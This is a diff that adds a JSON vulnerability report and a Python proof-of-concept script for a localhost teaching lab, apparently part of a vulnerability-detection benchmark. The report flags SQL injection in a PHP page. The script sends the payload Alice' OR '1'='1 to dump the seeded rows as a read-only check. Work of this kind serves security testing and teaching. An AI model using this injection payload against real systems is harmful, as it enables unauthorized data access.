@@ -1,0 +1,79 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 直接读取外部 GET 参数 $_GET['name']，未见过滤或类型约束。",
+    "flow": "F01:0010 将 $name 直接拼入单引号 SQL 字符串，形成 SELECT ... WHERE name = '<输入>'。",
+    "guard": "无效：F01:0007 到 F01:0010 未见绑定参数、转义或白名单；F01:0022 的 htmlspecialchars 仅保护输出，不保护 SQL。",
+    "sink": "F01:0011 调用 $db->query($sql) 执行拼接后的 SQL，结果在 F01:0021-F01:0023 展示。"
+  },
+  "prerequisites": [
+    "本地教学入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可达。",
+    "common/db_connect.php 成功提供已连接的 mysqli 变量 $db。",
+    "lab_people 表存在并预置 1 Alice、2 Bob、3 Carol。",
+    "查询结果回显在 HTML 正文中，无需登录。"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现未提供，仅依赖运行上下文声明 $db 已连接。",
+    "数据库用户权限及 MySQLi 错误模式未提供；本验证不依赖多语句，仅依赖普通 SELECT 可达和结果回显。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行：python3 s001_poc.py。脚本硬编码目标为 http://127.0.0.1:4280/lab_cases/S001/index.php，使用 http.client，不跟随重定向、不接受任意主机。普通对照 name=Alice 预期仅解析出 (1,Alice)；测试请求 name=Alice' OR '1'='1 预期解析出预置三条记录 (1,Alice),(2,Bob),(3,Carol)，数据库不应被修改。观察者应在脚本解析结果中看到普通一行、测试三行；若失败检查入口可达、common/db_connect.php 的 $db 连接、lab_people 预置数据和 MySQLi 错误模式。不能以 HTTP 200 作为成功；若连接失败或发生重定向则不判断。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import http.client
+import urllib.parse
+import re
+import html
+import sys
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S001/index.php"
+
+def fetch(name):
+    query = urllib.parse.urlencode({"name": name}, quote_via=urllib.parse.quote)
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
+    try:
+        conn.request("GET", PATH + "?" + query, headers={"Host": f"{HOST}:{PORT}"})
+        resp = conn.getresponse()
+        body = resp.read().decode("utf-8", "replace")
+        if resp.status != 200:
+            raise RuntimeError(f"HTTP status {resp.status}")
+        return body
+    finally:
+        conn.close()
+
+def parse_rows(body):
+    rows = []
+    for m in re.finditer(r'<p>ID\s*(\d+)：([^<]*)</p>', body):
+        rows.append((int(m.group(1)), html.unescape(m.group(2))))
+    return rows
+
+def main():
+    ordinary_rows = parse_rows(fetch("Alice"))
+    print("ordinary rows:", ordinary_rows)
+    if len(ordinary_rows) != 1 or ordinary_rows[0] != (1, "Alice"):
+        print("FAIL ordinary control: expected exactly [(1, 'Alice')].")
+        return 2
+
+    test_rows = parse_rows(fetch("Alice' OR '1'='1"))
+    print("test rows:", test_rows)
+    expected = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
+    if len(test_rows) != 3 or set(test_rows) != expected:
+        print("FAIL injection test: expected all three preset rows.")
+        return 3
+
+    print("PASS: ordinary=1 Alice row; test=all 3 preset rows; read-only test did not modify data.")
+    return 0
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
